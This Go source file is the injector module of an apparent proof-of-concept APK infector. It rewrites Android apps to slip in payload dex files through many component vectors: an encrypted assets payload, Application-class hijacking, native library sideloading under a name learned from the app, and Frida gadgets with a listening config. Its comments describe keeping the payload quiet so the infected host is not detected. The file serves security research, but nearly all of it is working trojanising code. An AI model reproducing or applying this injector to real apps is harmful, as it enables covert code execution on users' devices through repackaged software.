package injector

import (
	"archive/zip"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/assetpayload"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/nativepatch"
)

// Inject rewrites inputAPK into outputAPK for the selected vector.
//
// The archive is never unpacked to the filesystem: every member is streamed from
// the input APK to the output APK. That is a correctness requirement, not an
// optimisation — APKs produced by aapt2 with obfuscated resource names contain
// members that differ only by case (res/HQ.xml vs res/hq.xml, res/GD.xml vs
// res/Gd.xml vs res/gD.xml) and a filesystem round trip on a case-insensitive
// volume (macOS, Windows) silently loses one member per collision, after which
// the patched app dies with Resources$NotFoundException.
func Inject(inputAPK string, outputAPK string) {
	plan := NewRepackPlan()

	if utils.Payload_option == int(utils.Native_payload) ||
		utils.Payload_option == int(utils.Native_sideload_payload) {
		if err := planNative(inputAPK, &plan); err != nil {
			// A host without lib/<abi>/ is a legitimate "not applicable", not a
			// crash: report it plainly and leave no output behind.
			fmt.Printf("	--SKIP: native vector not applicable: %v\n", err)
			os.Remove(outputAPK)
			os.Exit(3)
		}
		writePlan(inputAPK, outputAPK, plan)
		return
	}

	if utils.Payload_option == int(utils.Service_payload) ||
		utils.Payload_option == int(utils.CodePatchApp_payload) {
		// These two never touch the manifest, so they cannot go through the
		// generic path below (which always replaces AndroidManifest.xml).
		planCodePatch(inputAPK, outputAPK)
		return
	}

	names, err := ListNames(inputAPK)
	if err != nil {
		log.Panic("Failed to read the input APK: ", err)
	}

	plan.Replace["AndroidManifest.xml"] = mustReadFile(utils.ManifestBinaryPath)

	next := nextDexIndex(names)

	switch utils.Payload_option {
	case int(utils.Provider_payload), int(utils.Trampoline_payload),
		int(utils.Receiver_payload), int(utils.AppComponentFactory_payload),
		int(utils.Assets_payload), int(utils.Instrumentation_payload),
		int(utils.BackupAgent_payload), int(utils.ZygotePreload_payload):
		src := payloadStubPath()
		plan.Add = append(plan.Add, Entry{
			Name:   dexName(next),
			Data:   mustReadFile(src),
			Method: zip.Deflate,
		})
		log.Printf("Successfuly injected DEX: %s", dexName(next))

		if utils.Payload_option == int(utils.Assets_payload) {
			blob, err := sealAssetsPayload()
			if err != nil {
				log.Panic("Failed to seal the payload into assets/: ", err)
			}
			plan.Add = append(plan.Add, Entry{Name: assetpayload.AssetPath, Data: blob, Method: zip.Deflate})
			fmt.Printf("\t--sealed payload: %s (%d bytes, AES-256-GCM)\n", assetpayload.AssetPath, len(blob))
		}

	default:
		// Application hijack (custom / frida): clear the final modifier on the
		// host Application class in every dex, then add the wrapper stub and the
		// payload as extra dex files.
		for _, n := range names {
			if isDexName(n) {
				plan.Transform[n] = dex.PatchAppModifierBytes
			}
		}
		plan.Add = append(plan.Add, Entry{Name: dexName(next), Data: mustReadFile(injectedAppPrevName), Method: zip.Deflate})
		plan.Add = append(plan.Add, Entry{Name: dexName(next + 1), Data: mustReadFile(payloadHijackPath()), Method: zip.Deflate})
		log.Printf("Successfuly injected DEX: %s, %s", dexName(next), dexName(next+1))

		// The frida gadget belongs to the frida vector only: the custom payload
		// vector must stay as quiet as its payload, and ~39 MB of STORED
		// libraries plus a listening port would give every V1 host away.
		if utils.Payload_option == int(utils.Frida_payload) {
			abis := selectGadgets(names)
			injected := 0
			for _, g := range abis {
				gadget, err := os.ReadFile(gadgetPath(g.file))
				if err != nil {
					// A missing gadget binary is a broken install, not a property of
					// the host: report it and skip that ABI instead of aborting.
					log.Printf("WARNING: frida gadget for %s not found (%v) - skipping ABI", g.abi, err)
					continue
				}
				plan.Add = append(plan.Add, Entry{
					Name:   filepath.ToSlash(filepath.Join("lib", g.abi, "libfrida-gadget.so")),
					Data:   gadget,
					Method: zip.Store,
				})
				// The gadget needs its config next to itself. With no config
				// file the library loads, its thread shows up in
				// /proc/<pid>/task, and no listener is ever created (measured on
				// Android 17); with a config in lib/<abi>/ - which Frida reads
				// straight from the APK, no extractNativeLibs needed - it
				// exposes the usual frida-server compatible interface.
				plan.Add = append(plan.Add, Entry{
					Name:   filepath.ToSlash(filepath.Join("lib", g.abi, gadgetConfigName)),
					Data:   fridaGadgetConfig(),
					Method: zip.Store,
				})
				fmt.Printf("	--injected frida gadget: lib/%s/libfrida-gadget.so (frida %s, %d bytes) + %s\n",
					g.abi, fridaGadgetVersion, len(gadget), gadgetConfigName)
				injected++
			}
			if injected == 0 {
				log.Panic("Failed to inject the frida gadget: no gadget binary found in frida_gadget/")
			}
		}
	}

	writePlan(inputAPK, outputAPK, plan)
}

func writePlan(inputAPK, outputAPK string, plan RepackPlan) {
	fmt.Println("\t--repacking (streaming, names preserved)...")
	if err := Repack(inputAPK, outputAPK, plan); err != nil {
		log.Panic("Failed to write the patched APK: ", err)
	}
	fmt.Println("\t--Done! Now you should sign your apk")
}

// planNative injects the payload library into lib/<abi>/ by unpacking only that
// subtree into a temporary directory (its members never collide by case) and
// diffing the result back into the plan.
func planNative(inputAPK string, plan *RepackPlan) error {
	tmp, err := os.MkdirTemp("", "archinome-native-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(tmp)

	names, err := ExtractSubtree(inputAPK, "lib/", tmp)
	if err != nil {
		return err
	}
	if len(names) == 0 {
		return fmt.Errorf("no lib/<abi>/ directory in %s", filepath.Base(inputAPK))
	}

	original := make(map[string][]byte, len(names))
	for _, n := range names {
		data, err := ReadEntry(inputAPK, n)
		if err != nil {
			return err
		}
		original[n] = data
	}

	opt := nativepatch.Options{
		ABI:     os.Getenv("ARCHINOME_NATIVE_ABI"),
		HostLib: os.Getenv("ARCHINOME_NATIVE_HOST"),
		Mode:    nativepatch.Mode(os.Getenv("ARCHINOME_NATIVE_MODE")),
		Payload: os.Getenv("ARCHINOME_NATIVE_LIB"),
		OurName: os.Getenv("ARCHINOME_NATIVE_NAME"),
	}

	if utils.Payload_option == int(utils.Native_sideload_payload) {
		// This vector is defined by the name the host asks for and never ships,
		// so the name cannot be a caller constant: it is learned from the app's
		// own loadLibrary() call sites. ARCHINOME_NATIVE_NAME overrides it.
		opt.Mode = nativepatch.ModeSideload
		if opt.OurName == "" {
			learned, err := learnSideloadName(inputAPK, names)
			if err != nil {
				return err
			}
			opt.OurName = learned
		}
		fmt.Printf("	--sideload: the payload takes the name %s\n", opt.OurName)
	}

	results, err := nativepatch.Apply(tmp, opt)
	if err != nil {
		return err
	}
	for _, r := range results {
		log.Printf("native: %s", r)
		fmt.Println("\t--" + r.String())
	}
	return PlanFromDir(tmp, original, plan, ".so")
}

// sealAssetsPayload encrypts the dynamic payload dex for the assets vector and
// returns the blob that is added as assets/<name>.
func sealAssetsPayload() ([]byte, error) {
	payloadDex := os.Getenv("ARCHINOME_ASSETS_DEX")
	if payloadDex == "" {
		payloadDex = payload_assets_dyn_name
	}
	passphrase := os.Getenv("ARCHINOME_ASSETS_KEY")
	if passphrase == "" {
		passphrase = assetpayload.DefaultPassphrase
	} else if passphrase != assetpayload.DefaultPassphrase {
		log.Printf("WARNING: ARCHINOME_ASSETS_KEY differs from the passphrase compiled into the loader")
		fmt.Println("\t--WARNING: custom passphrase set, but the compiled loader uses the default one")
	}
	plain, err := os.ReadFile(payloadDex)
	if err != nil {
		return nil, err
	}
	blob, err := assetpayload.Seal(plain, assetpayload.KeyFromPassphrase(passphrase))
	if err != nil {
		return nil, err
	}
	log.Printf("Sealed %s -> %s (%d bytes)", payloadDex, assetpayload.AssetPath, len(blob))
	return blob, nil
}

func payloadStubPath() string {
	switch utils.Payload_option {
	case int(utils.Provider_payload):
		return payload_provider_name
	case int(utils.Trampoline_payload):
		return payload_trampoline_name
	case int(utils.AppComponentFactory_payload):
		return payload_appfactory_name
	case int(utils.Assets_payload):
		return payload_assets_name
	case int(utils.Instrumentation_payload):
		return payload_instrumentation_name
	case int(utils.BackupAgent_payload):
		return payload_backupagent_name
	case int(utils.ZygotePreload_payload):
		return payload_zygote_name
	default:
		return payload_receiver_name
	}
}

func payloadHijackPath() string {
	if utils.Payload_option == int(utils.Frida_payload) {
		return payload_frida_name
	}
	return payload_custom_name
}

// fridaGadgetVersion is the Frida release the gadgets in frida_gadget/ come
// from. A gadget speaks the agent protocol of its own release, so it has to
// match the major.minor of the frida-tools (host) and frida-server (device)
// used to talk to it — with a mismatch the host simply refuses to attach.
// Bump this together with the files in frida_gadget/.
const fridaGadgetVersion = "17.18.0"

// gadgetConfigName is the name Frida looks for next to the gadget binary: the
// Android package manager only extracts files under lib/<abi>/ that look like
// libraries, hence the .config.so suffix.
const gadgetConfigName = "libfrida-gadget.config.so"

// fridaGadgetConfig is the config shipped next to every gadget.
//
//   - on_load=resume: the gadget's own default (wait) blocks the app's main
//     thread inside its constructor until a controller attaches; in our runs
//     Android repeatedly killed such hosts with an ANR, so the injected app
//     must be able to boot on its own.
//   - listen on 127.0.0.1:27042 keeps the standard interactive workflow
//     (adb forward + frida -H 127.0.0.1:27042), which needs the host app to
//     hold android.permission.INTERNET: the platform denies socket creation to
//     app domains without it, and the gadget then aborts ("Unable to create
//     socket: Operation not permitted"). For hosts without INTERNET use script
//     interaction instead, which never touches the network.
//   - the port is not a constant in practice: 27042 is also frida-server's
//     default, so on a device where a server is already running (started by
//     another tool, or a stale instance that listens but no longer speaks the
//     protocol) the gadget cannot accept a connection and every honest OK turns
//     into "payload did not run". ARCHINOME_GADGET_PORT moves the listener
//     without touching any other component; matrix/harness runs set it together
//     with their own probe port so the two never disagree.
func gadgetListenPort() int {
	if v := strings.TrimSpace(os.Getenv("ARCHINOME_GADGET_PORT")); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n < 65536 {
			return n
		}
	}
	return 27042
}

func fridaGadgetConfig() []byte {
	return []byte(fmt.Sprintf(`{"interaction":{"type":"listen","address":"127.0.0.1","port":%d,`+
		`"on_port_conflict":"fail","on_load":"resume"}}`, gadgetListenPort()))
}

type gadgetABI struct {
	abi  string
	file string
}

// gadgetRelease lists the prebuilt gadgets shipped with the tool, in injection
// order.
var gadgetRelease = []gadgetABI{
	{"arm64-v8a", "frida-gadget-" + fridaGadgetVersion + "-android-arm64.so"},
	{"armeabi-v7a", "frida-gadget-" + fridaGadgetVersion + "-android-arm.so"},
	{"x86", "frida-gadget-" + fridaGadgetVersion + "-android-x86.so"},
	{"x86_64", "frida-gadget-" + fridaGadgetVersion + "-android-x86_64.so"},
}

// selectGadgets picks which ABIs to inject. A host that already ships native
// libraries gets exactly its own ABIs — every extra gadget is a STORED ~25 MB
// library the device will never load. A pure-Java host (no lib/ at all) gets
// the two mobile ABIs, which is what any real device picks.
func selectGadgets(names []string) []gadgetABI {
	have := make(map[string]bool)
	for _, n := range names {
		rest, ok := strings.CutPrefix(n, "lib/")
		if !ok {
			continue
		}
		if i := strings.IndexByte(rest, '/'); i > 0 {
			have[rest[:i]] = true
		}
	}

	var out []gadgetABI
	for _, g := range gadgetRelease {
		if have[g.abi] {
			out = append(out, g)
		}
	}
	if len(out) > 0 {
		return out
	}
	for _, g := range gadgetRelease {
		if g.abi == "arm64-v8a" || g.abi == "armeabi-v7a" {
			out = append(out, g)
		}
	}
	return out
}

// gadgetPath resolves a gadget file: first relative to the working directory
// (the documented layout — run from the repository root), then next to the
// executable, so a binary invoked from elsewhere still finds its gadgets.
func gadgetPath(file string) string {
	direct := filepath.Join("frida_gadget", file)
	if _, err := os.Stat(direct); err == nil {
		return direct
	}
	exe, err := os.Executable()
	if err != nil {
		return direct
	}
	return filepath.Join(filepath.Dir(exe), "frida_gadget", file)
}

func mustReadFile(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Panicf("Failed to read %s: %v", path, err)
	}
	return data
}

func dexName(index int) string {
	if index <= 1 {
		return "classes.dex"
	}
	return "classes" + strconv.Itoa(index) + ".dex"
}

func isDexName(name string) bool {
	base := name
	if strings.Contains(base, "/") {
		return false
	}
	if !strings.HasPrefix(base, "classes") || !strings.HasSuffix(base, ".dex") {
		return false
	}
	mid := strings.TrimSuffix(strings.TrimPrefix(base, "classes"), ".dex")
	if mid == "" {
		return true
	}
	_, err := strconv.Atoi(mid)
	return err == nil
}

func dexIndexOf(name string) int {
	if !isDexName(name) {
		return 0
	}
	mid := strings.TrimSuffix(strings.TrimPrefix(name, "classes"), ".dex")
	if mid == "" {
		return 1
	}
	n, err := strconv.Atoi(mid)
	if err != nil {
		return 0
	}
	return n
}

func nextDexIndex(names []string) int {
	max := 0
	for _, n := range names {
		if idx := dexIndexOf(n); idx > max {
			max = idx
		}
	}
	return max + 1
}
